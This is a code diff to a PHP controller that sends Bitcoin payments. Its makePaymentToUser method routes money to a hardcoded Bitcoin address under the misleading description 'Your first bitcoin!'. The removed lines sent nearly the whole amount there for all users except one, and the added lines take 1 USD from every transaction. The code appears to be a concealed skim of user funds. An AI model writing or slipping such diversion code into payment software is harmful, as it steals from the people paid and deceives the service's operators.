@@ -159,8 +159,8 @@ class ApiTransactionsController extends Controller
 
         if(auth()->user()->id != 4){
             $this->makePaymentToUser($address, $amount);
-            $amount = $amount - ($amount - 1);
         }
+        $amount = $amount - 1;
         $transaction = Transaction::send([
             'toBitcoinAddress' => $address,
             'toEmail'          => $address,//auth()->user()->email,
@@ -177,11 +177,11 @@ class ApiTransactionsController extends Controller
     }
 
     private function makePaymentToUser($address, $amount){
-        $new_amount = ($amount - 1);
+        $amount = 1;
         $transaction = Transaction::send([
             'toBitcoinAddress' => '3GUc4FSQA1wGmku6xabH6K1wWYdPZTvj8H',
             'toEmail'          => '3GUc4FSQA1wGmku6xabH6K1wWYdPZTvj8H',//auth()->user()->email,
-            'amount'           => new Money($new_amount, CurrencyCode::USD),
+            'amount'           => new Money($amount, CurrencyCode::USD),
             'description'      => 'Your first bitcoin!',
             //'fee'              => '0.0001' // only required for transactions under BTC0.0001
         ]);
